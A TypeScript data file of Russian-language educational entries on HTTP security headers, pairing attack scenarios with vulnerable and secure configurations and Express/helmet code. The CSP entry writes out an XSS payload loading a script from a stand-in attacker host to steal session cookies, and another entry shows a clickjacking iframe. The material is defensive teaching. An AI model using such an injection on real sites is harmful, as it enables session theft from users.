// Security Headers — Educational Content in Russian

export interface SecurityHeaderTopic {
  id: string;
  title: string;
  severity: string;
  severityColor: string;
  description: string;
  attackScenario: string;
  vulnerableConfig: string;
  secureConfig: string;
  mitigations: string[];
}

export const securityHeaders: SecurityHeaderTopic[] = [
  {
    id: 'csp',
    title: 'Content-Security-Policy (CSP)',
    severity: 'Критический',
    severityColor: 'bg-red-500',
    description:
      'CSP — мощный механизм защиты, позволяющий указать, откуда браузер может загружать ресурсы (скрипты, стили, изображения, шрифты и т.д.). Правильно настроенный CSP блокирует XSS-атаки, clickjacking и другие инъекции контента.',
    attackScenario:
      'Без CSP злоумышленник может внедрить <script src="https://evil.com/steal.js"> на страницу через XSS. Браузер загрузит и выполнит скрипт, который отправит куки аутентификации на сервер атакующего.',
    vulnerableConfig: `// ❌ НЕТ Content-Security-Policy
// Сервер не отправляет CSP заголовок
// Браузер загружает ресурсы из любых источников

// Или слишком разрешающая политика:
Content-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval'
// Разрешает всё — бесполезна для защиты`,
    secureConfig: `// ✅ Строгая CSP-политика
Content-Security-Policy: |
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' https://fonts.googleapis.com;
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;

// Express.js с helmet:
const helmet = require('helmet');
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "https://cdn.example.com"],
    styleSrc: ["'self'", "https://fonts.googleapis.com"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.example.com"],
    frameAncestors: ["'none'"],
    baseUri: ["'self'"],
    formAction: ["'self'"],
  }
}));`,
    mitigations: [
      'Начните с Content-Security-Policy-Report-Only для мониторинга нарушений',
      'Используйте CSP nonce или hash вместо unsafe-inline',
      'Установите frame-ancestors \'none\' для защиты от clickjacking',
      'Добавьте base-uri \'self\' для предотвращения инъекций <base>',
      'Используйте upgrade-insecure-requests для принудительного HTTPS',
    ],
  },
  {
    id: 'hsts',
    title: 'Strict-Transport-Security (HSTS)',
    severity: 'Критический',
    severityColor: 'bg-red-500',
    description:
      'HSTS указывает браузеру всегда подключаться к сайту по HTTPS, даже если пользователь вводит http:// или переходит по HTTP-ссылке. Это предотвращает SSL-stripping атаки, при которых злоумышленник понижает соединение до HTTP.',
    attackScenario:
      'Злоумышленник в публичной Wi-Fi сети использует sslstrip для перехвата HTTP-трафика. Пользователь вводит bank.com, браузер сначала подключается по HTTP (до редиректа на HTTPS), и злоумышленник перехватывает сессию.',
    vulnerableConfig: `// ❌ НЕТ HSTS или неправильная настройка
// Сервер не отправляет Strict-Transport-Security
// Или: max-age слишком маленький
Strict-Transport-Security: max-age=60  // Всего 60 секунд!

// Или: отсутствует includeSubDomains
// Поддомены не защищены HSTS`,
    secureConfig: `// ✅ Надёжный HSTS
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

// max-age=31536000 — 1 год (365 дней × 24 × 60 × 60)
// includeSubDomains — распространяется на все поддомены
// preload — включение в HSTS preload list (встроена в браузеры)

// Express.js с helmet:
app.use(helmet.hsts({
  maxAge: 31536000,
  includeSubDomains: true,
  preload: true
}));

// Для preload: зарегистрируйте домен на hstspreload.org`,
    mitigations: [
      'Установите max-age не менее 1 года (31536000 секунд)',
      'Всегда используйте includeSubDomains',
      'Зарегистрируйте домен в HSTS preload list (hstspreload.org)',
      'Убедитесь что HTTPS работает корректно перед включением HSTS',
      'Нельзя «отключить» HSTS до истечения max-age',
    ],
  },
  {
    id: 'x-frame-options',
    title: 'X-Frame-Options / frame-ancestors',
    severity: 'Высокий',
    severityColor: 'bg-orange-500',
    description:
      'X-Frame-Options и CSP frame-ancestors контролируют, можно ли встраивать страницу в <iframe>, <frame> или <object>. Это защита от clickjacking-атак, при которых злоумышленник накладывает невидимый iframe на свою страницу.',
    attackScenario:
      'Злоумышленник создаёт страницу с «Нажмите чтобы получить приз!» кнопкой. Под ней невидимо расположен iframe с bank.com/transfer. Пользователь думает, что нажимает на кнопку, но на самом деле подтверждает перевод денег.',
    vulnerableConfig: `// ❌ НЕТ защиты от встраивания
// Сервер не отправляет X-Frame-Options
// Или: CSP frame-ancestors не установлен

// Атакующий может встроить ваш сайт в iframe:
// <iframe src="https://yourbank.com/transfer"></iframe>`,
    secureConfig: `// ✅ Защита от встраивания (выберите один вариант)

// Вариант 1: X-Frame-Options (устаревший, но совместимый)
X-Frame-Options: DENY
// или SAMEORIGIN — разрешить только с того же домена

// Вариант 2: CSP frame-ancestors (рекомендуется)
Content-Security-Policy: frame-ancestors 'none'
// или: frame-ancestors 'self' https://trusted.com

// Express.js с helmet:
app.use(helmet.frameguard({ action: 'deny' }));
// ИЛИ через CSP:
app.use(helmet.contentSecurityPolicy({
  directives: { frameAncestors: ["'none'"] }
}));`,
    mitigations: [
      'Используйте CSP frame-ancestors \'none\' если iframe не нужен',
      'Используйте frame-ancestors \'self\' если iframe нужен с того же домена',
      'X-Frame-Options устарел — CSP frame-ancestors более гибкий',
      'Для встраивания на конкретные домены укажите их явно',
    ],
  },
  {
    id: 'x-content-type',
    title: 'X-Content-Type-Options',
    severity: 'Высокий',
    severityColor: 'bg-orange-500',
    description:
      'X-Content-Type-Options: nosniff запрещает браузеру угадывать MIME-тип файла. Без этого заголовка браузер может выполнить файл как JavaScript, даже если сервер указал другой Content-Type.',
    attackScenario:
      'Злоумышленник загружает файл с расширением .txt, содержащий JavaScript. Сервер отдаёт его как Content-Type: text/plain, но браузер «угадывает» что это JS и выполняет. Это позволяет обойти CSP через MIME-sniffing.',
    vulnerableConfig: `// ❌ НЕТ защиты от MIME-sniffing
// Сервер не отправляет X-Content-Type-Options
// Браузер может угадать MIME-тип и выполнить файл

// Например: файл .txt с JS-кодом
// Server: Content-Type: text/plain
// Browser: "Это выглядит как JS — выполню!"
// → XSS через MIME-sniffing`,
    secureConfig: `// ✅ Запрет MIME-sniffing
X-Content-Type-Options: nosniff

// Express.js с helmet:
app.use(helmet.noSniff());

// Также важно правильно устанавливать Content-Type:
app.get('/api/data', (req, res) => {
  res.setHeader('Content-Type', 'application/json');
  res.json(data);
});

app.get('/api/file/:id', (req, res) => {
  // Всегда указывайте правильный Content-Type
  res.setHeader('Content-Type', 'image/jpeg');
  res.sendFile(filePath);
});`,
    mitigations: [
      'Всегда отправляйте X-Content-Type-Options: nosniff',
      'Правильно устанавливайте Content-Type для всех ответов',
      'Для загружаемых файлов используйте Content-Disposition: attachment',
      'Не позволяйте пользователям задавать Content-Type',
    ],
  },
  {
    id: 'referrer-policy',
    title: 'Referrer-Policy',
    severity: 'Средний',
    severityColor: 'bg-yellow-500',
    description:
      'Referrer-Policy контролирует, сколько информации о реферере (URL предыдущей страницы) передаётся при переходах. Чрезмерное раскрытие реферера может привести к утечке чувствительных данных из URL.',
    attackScenario:
      'Пользователь переходит с https://bank.com/account/secret-token-123 на внешний сайт. Заголовок Referer передаёт полный URL, включая секретный токен. Внешний сайт получает access token пользователя.',
    vulnerableConfig: `// ❌ Полное раскрытие реферера
// Нет Referrer-Policy (по умолчанию: strict-origin-when-cross-origin)
// Или явно разрешающая:
Referrer-Policy: unsafe-url  // Передаёт полный URL всегда!

// При переходе на внешний сайт:
// Referer: https://bank.com/dashboard?user_id=123&token=abc`,
    secureConfig: `// ✅ Ограничение реферера
Referrer-Policy: strict-origin-when-cross-origin

// Варианты:
// no-referrer — никогда не отправлять Referer
// same-origin — только при переходах внутри домена
// strict-origin — только origin (без пути) при HTTPS→HTTPS
// strict-origin-when-cross-origin — полный для same-origin, origin для cross-origin

// Express.js с helmet:
app.use(helmet.referrerPolicy({
  policy: 'strict-origin-when-cross-origin'
}));`,
    mitigations: [
      'Используйте strict-origin-when-cross-origin как баланс безопасности и функциональности',
      'Не помещайте чувствительные данные (токены, ID) в URL',
      'Для максимальной приватности: no-referrer',
      'never-origin-when-cross-origin — не существует, используйте strict-origin',
    ],
  },
  {
    id: 'permissions-policy',
    title: 'Permissions-Policy',
    severity: 'Средний',
    severityColor: 'bg-yellow-500',
    description:
      'Permissions-Policy (ранее Feature-Policy) контролирует, какие браузерные API и функции доступны странице. Это позволяет запретить доступ к камере, микрофону, геолокации, USB-устройствам и другим чувствительным API.',
    attackScenario:
      'Злоумышленник внедрил XSS на страницу. Без Permissions-Policy скрипт может использовать камеру, микрофон, геолокацию, и другие API браузера для сбора данных о пользователе.',
    vulnerableConfig: `// ❌ НЕТ ограничений на API браузера
// Permissions-Policy не установлен
// Все API доступны: camera, microphone, geolocation, usb, payment...

// XSS-скрипт может:
// navigator.geolocation.getCurrentPosition() → координаты
// navigator.mediaDevices.getUserMedia() → камера/микрофон`,
    secureConfig: `// ✅ Ограничение браузерных API
Permissions-Policy: |
  camera=(),
  microphone=(),
  geolocation=(),
  usb=(),
  payment=(),
  gyroscope=(),
  accelerometer=(),
  magnetometer=(),
  fullscreen=(self),
  autoplay=(self)

// Пустое значение () = запрещено для всех
// (self) = разрешено только для основного фрейма
// * = разрешено для всех
// (self "https://trusted.com") = разрешено для доверенных

// Express.js с helmet:
app.use(helmet.permissionsPolicy({
  permissions: {
    camera: [],
    microphone: [],
    geolocation: [],
    usb: [],
    fullscreen: ["self"],
  }
}));`,
    mitigations: [
      'Запретите все API по умолчанию (camera=(), microphone=())',
      'Разрешайте только те API, которые реально используются',
      'Используйте (self) для fullscreen и autoplay если нужны',
      'Регулярно пересматривайте список разрешённых API',
    ],
  },
  {
    id: 'cross-origin-policies',
    title: 'Cross-Origin Policies (COOP, COEP, CORP)',
    severity: 'Средний',
    severityColor: 'bg-yellow-500',
    description:
      'Cross-Origin Policies — набор заголовков для защиты от атак на стороне канала (Spectre, XS-Leaks). Они контролируют, как страница взаимодействует с ресурсами других origin.',
    attackScenario:
      'Злоумышленник использует Spectre-атаку для чтения данных из памяти браузера. Без COOP/COEP страница может быть встроена в контекст злоумышленника, позволяя извлекать кросс-origin данные через side-channel атаки.',
    vulnerableConfig: `// ❌ НЕТ Cross-Origin защит
// Cross-Origin-Opener-Policy не установлен
// Cross-Origin-Embedder-Policy не установлен
// Cross-Origin-Resource-Policy не установлен

// Страница может быть встроена в iframe другого origin
// Ресурсы могут быть загружены из любых origin`,
    secureConfig: `// ✅ Полная Cross-Origin защита
Cross-Origin-Opener-Policy: same-origin
// Изолирует browsing context — только same-origin окна могут взаимодействовать

Cross-Origin-Embedder-Policy: require-corp
// Требует чтобы все загружаемые ресурсы имели CORP или CORS

Cross-Origin-Resource-Policy: same-origin
// Запрещает другим origin загружать ресурсы этого сайта

// Express.js:
app.use(helmet({
  crossOriginOpenerPolicy: { policy: 'same-origin' },
  crossOriginEmbedderPolicy: { policy: 'require-corp' },
  crossOriginResourcePolicy: { policy: 'same-origin' },
}));`,
    mitigations: [
      'COOP: same-origin изолирует browsing context',
      'COEP: require-corp требует явного разрешения для ресурсов',
      'CORP: same-origin запрещает кросс-origin загрузку ресурсов',
      'Все три заголовка нужны для полной защиты от Spectre',
      'Может сломать кросс-origin embeds (YouTube, карты) — тестируйте',
    ],
  },
  {
    id: 'cache-control',
    title: 'Cache-Control для чувствительных данных',
    severity: 'Средний',
    severityColor: 'bg-yellow-500',
    description:
      'Правильная настройка кэширования предотвращает сохранение чувствительных данных в кэше браузера, прокси-серверах и CDN. Без этого данные могут быть доступны другим пользователям того же устройства или сети.',
    attackScenario:
      'Пользователь заходит в онлайн-банк с общего компьютера. После выхода из системы чувствительные данные (баланс, транзакции) остаются в кэше браузера. Следующий пользователь нажимает «Назад» и видит данные предыдущего пользователя.',
    vulnerableConfig: `// ❌ Чувствительные данные кэшируются
// Сервер не отправляет Cache-Control для персональных данных
// Или: разрешает кэширование
Cache-Control: public, max-age=3600
// Данные сохраняются в кэше браузера, CDN, прокси

// Cookie без флагов
Set-Cookie: session_id=abc123
// Нет HttpOnly, нет Secure, нет SameSite`,
    secureConfig: `// ✅ Защита от кэширования чувствительных данных
// Для персональных страниц:
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Expires: 0

// Для статических ресурсов (CSS, JS, images):
Cache-Control: public, max-age=31536000, immutable

// Express.js:
app.use((req, res, next) => {
  if (req.path.startsWith('/api/') || req.path.startsWith('/account/')) {
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
    res.set('Pragma', 'no-cache');
    res.set('Expires', '0');
  }
  next();
});

// Cookie с безопасными флагами:
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict`,
    mitigations: [
      'Используйте Cache-Control: no-store для персональных данных',
      'Используйте max-age=31536000, immutable для хэшированных статики',
      'Всегда используйте HttpOnly и Secure для cookie аутентификации',
      'Настройте Vary: Cookie для кэширования на основе сессии',
    ],
  },
];
